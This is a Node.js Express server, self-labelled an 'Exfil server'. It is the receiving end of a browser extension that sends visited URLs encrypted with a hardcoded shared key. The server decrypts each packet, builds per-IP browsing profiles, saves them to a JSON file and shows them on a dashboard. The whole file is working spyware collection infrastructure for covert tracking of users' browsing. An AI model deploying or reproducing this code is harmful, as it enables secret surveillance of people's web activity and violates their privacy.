const express  = require("express");
const cors     = require("cors");
const crypto   = require("crypto");
const path     = require("path");
const fs       = require("fs");

// Must match PSK in background.js
const PSK  = "ch40s_r3s34rch_k3y_2026";
const SALT = "dnr-salt";

const deriveKey = () =>
    crypto.pbkdf2Sync(PSK, SALT, 100000, 32, "sha256");

const decryptPayload = ({ iv, ct }) => {
    const key      = deriveKey();
    const ivBuf    = Buffer.from(iv, "base64");
    const ctBuf    = Buffer.from(ct, "base64");
    const tag      = ctBuf.slice(-16);
    const data     = ctBuf.slice(0, -16);
    const decipher = crypto.createDecipheriv("aes-256-gcm", key, ivBuf);
    decipher.setAuthTag(tag);
    return decipher.update(data, null, "utf8") + decipher.final("utf8");
};

const app  = express();
const PORT = 3000;
const DATA_FILE = path.join(__dirname, "profiles.json");

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// Serve dashboard as the root page
app.get("/", (_, res) => res.sendFile(path.join(__dirname, "public", "dashboard.html")));

// IP profiles: Map<ip, { firstSeen, lastSeen, entries: [{url, partial, ts}] }>
const profiles = new Map();

// Load persisted profiles from disk on startup
if (fs.existsSync(DATA_FILE)) {
    try {
        const saved = JSON.parse(fs.readFileSync(DATA_FILE, "utf8"));
        for (const [ip, data] of Object.entries(saved)) profiles.set(ip, data);
        console.log(`[*] Loaded ${profiles.size} profile(s) from ${DATA_FILE}`);
    } catch (e) {
        console.warn("[!] Could not load profiles.json:", e.message);
    }
}

const saveProfiles = () => {
    const out = {};
    for (const [ip, data] of profiles) out[ip] = data;
    fs.writeFileSync(DATA_FILE, JSON.stringify(out, null, 2));
};

const getIp = (req) =>
    (req.headers["x-forwarded-for"] || "").split(",")[0].trim() ||
    req.socket.remoteAddress ||
    "unknown";

// POST /upload — accepts AES-GCM encrypted JSON packet from the extension
app.post("/upload", (req, res) => {
    const { iv, ct, ts } = req.body || {};
    if (!iv || !ct) return res.status(400).json({ error: "Missing iv or ct" });

    let urls, partial;
    try {
        const plain  = decryptPayload({ iv, ct });
        const parsed = JSON.parse(plain);
        // Support both old format (plain array) and new format ({ urls, partial })
        if (Array.isArray(parsed)) {
            urls    = parsed;
            partial = false;
        } else {
            urls    = parsed.urls;
            partial = parsed.partial || false;
        }
    } catch (e) {
        console.error("[-] Decryption failed:", e.message);
        console.error("    iv length (decoded):", Buffer.from(iv, "base64").length, "bytes");
        console.error("    ct length (decoded):", Buffer.from(ct, "base64").length, "bytes");
        return res.status(400).json({ error: "Decryption failed" });
    }

    const ip        = getIp(req);
    const timestamp = new Date(ts || Date.now()).toISOString();

    if (!profiles.has(ip)) {
        profiles.set(ip, { firstSeen: timestamp, lastSeen: timestamp, entries: [] });
        console.log(`[+] New profile created for ${ip}`);
    }
    const profile  = profiles.get(ip);
    profile.lastSeen = timestamp;

    for (const url of urls) {
        profile.entries.push({ url, partial, ts: timestamp });
        console.log(`[+] ${ip}${partial ? " (partial)" : ""}: ${url}`);
    }

    saveProfiles();
    res.json({ ok: true, received: urls.length });
});

// GET /health — connectivity check used by the extension popup
app.get("/health", (_, res) => res.json({ ok: true }));

// GET /profiles — all IP profiles as JSON (used by dashboard)
app.get("/profiles", (_, res) => {
    const out = {};
    for (const [ip, data] of profiles) out[ip] = data;
    res.json(out);
});

// DELETE /profiles — wipe all collected data
app.delete("/profiles", (_, res) => {
    profiles.clear();
    saveProfiles();
    console.log("[!] All profiles cleared via dashboard");
    res.json({ ok: true });
});

app.listen(PORT, () => {
    console.log(`[*] Exfil server listening on http://localhost:${PORT}`);
    console.log(`[*] Dashboard: http://localhost:${PORT}/`);
});
